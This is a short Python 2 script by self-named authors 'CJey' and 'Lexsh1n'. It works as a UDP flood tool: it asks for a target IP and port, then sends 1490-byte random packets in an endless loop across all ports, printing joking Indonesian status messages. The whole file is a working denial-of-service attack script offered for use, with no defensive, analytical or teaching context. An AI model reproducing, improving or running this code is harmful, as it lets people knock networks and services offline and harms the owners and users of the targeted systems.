#!/usr/bin/env python2
import sys
import os
import time
import socket
import random

K = '\033[93m'
U = '\033[95m'
C = '\033[94m'
R = '\033[91m'
H = '\033[92m'

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("START PAKET")
print
print (H+"Author   :  CJey")
print (H+"TEAM     : Lexsh1nXCJey")
print (H+"Thanks   : Lexsh1n and CJey")
print
ip = raw_input(R+"IP Target : ")
port = input(R+"Port       : ")

os.system("clear")
os.system("figlet Packet Starting")
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(1)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print (R+" SENT PACK %s TOK TOK BARANG SAMPAI IP %s DAN MEMBERI ROTI KEPORT %s!!"%(sent,ip,port))
     if port == 65534:
       port = 1